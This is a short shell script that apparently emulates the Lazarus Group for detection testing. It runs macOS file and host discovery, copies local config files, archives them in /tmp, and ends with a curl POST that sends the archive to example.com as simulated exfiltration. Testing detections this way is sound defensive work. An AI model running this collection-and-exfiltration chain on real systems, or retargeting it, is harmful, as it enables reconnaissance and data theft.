# description: Lazarus-like chained collection, staging, and simulated exfiltration
# actor: Lazarus Group — behavioural emulation only
# mitre: T1005, T1083, T1074.001, T1082, T1560.001, T1041
# reference: https://attack.mitre.org/groups/G0032/
# reference: https://attack.mitre.org/techniques/T1005/
# reference: https://attack.mitre.org/techniques/T1083/
# reference: https://attack.mitre.org/techniques/T1560/001/
# reference: https://attack.mitre.org/techniques/T1041/

COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID:?ESGRAPH_RUN_ID is required}"; mkdir -p "${COLLECT}/enum" "${COLLECT}/loot"

# T1083 discovery
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'find /Users -maxdepth 3 -type f 2>/dev/null | head -300 > "$1/enum/user-files.txt" || true' _ "${COLLECT}"
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /Users > "$1/enum/users-dir.txt" 2>/dev/null || true' _ "${COLLECT}"
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /Library/LaunchAgents > "$1/enum/launchagents-system.txt" 2>/dev/null || true' _ "${COLLECT}"
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'ls -la ~/Library/LaunchAgents > "$1/enum/launchagents-user.txt" 2>/dev/null || true' _ "${COLLECT}"

# T1005 collection of benign, local files
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'cp /etc/hosts "$1/loot/hosts.copy" 2>/dev/null || true' _ "${COLLECT}"
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'cp /etc/resolv.conf "$1/loot/resolv.copy" 2>/dev/null || true' _ "${COLLECT}"
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'cp "$1/enum/user-files.txt" "$1/loot/user-files.snapshot.txt" 2>/dev/null || true' _ "${COLLECT}"

# T1082 host profiling
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c '{ echo "hostname=$(hostname)"; uname -a; sw_vers 2>/dev/null || true; } > "$1/enum/host-profile.txt"' _ "${COLLECT}"

# T1074.001 + T1560.001 stage and archive
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c '{ echo "scenario=lazarus_collection"; echo "collected_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"; ls -la "$1"; } > "$1/manifest.txt"' _ "${COLLECT}"
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'tar -czf "$1/collection.tgz" -C "$1" enum loot manifest.txt 2>/dev/null || true' _ "${COLLECT}"

# T1041 simulated outbound transfer.
COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c '[[ -f "$1/collection.tgz" ]] && curl -m 3 -sS -o /dev/null -X POST https://example.com/ --data-binary @"$1/collection.tgz" || true' _ "${COLLECT}"

COLLECT="/tmp/lz_collect_${ESGRAPH_RUN_ID}"; bash -c 'ls -la "$1" "$1/enum" "$1/loot" 2>/dev/null || true' _ "${COLLECT}"
